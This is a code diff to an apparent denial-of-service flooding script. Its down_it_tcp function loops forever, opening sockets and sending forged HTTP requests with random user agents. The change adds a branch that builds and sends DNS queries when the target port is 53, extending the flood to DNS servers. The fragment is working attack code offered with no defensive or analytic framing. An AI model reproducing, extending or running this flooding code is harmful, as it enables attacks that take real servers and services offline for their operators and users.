@@ -137,11 +137,17 @@ def down_it_http():
 
 def down_it_tcp():
     while True:
-        packet = ("GET / HTTP/1.1"
-                  + "\nHost: " + host
-                  + "\nUser-Agent: " + random.choice(uagent)
-                  + data
-                  + "\n\n").encode('utf-8')
+        if port == 53:
+            query = DNSRecord.question(resource)
+            packet = bytes(query.pack())
+            if error_debug:
+                print('\033[92m DNS Q: ' + str(query) + ' \033[0;0m')
+        else:
+            packet = ("GET / HTTP/1.1"
+                      + "\nHost: " + host
+                      + "\nUser-Agent: " + random.choice(uagent)
+                      + data
+                      + "\n\n").encode('utf-8')
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5)
         try:
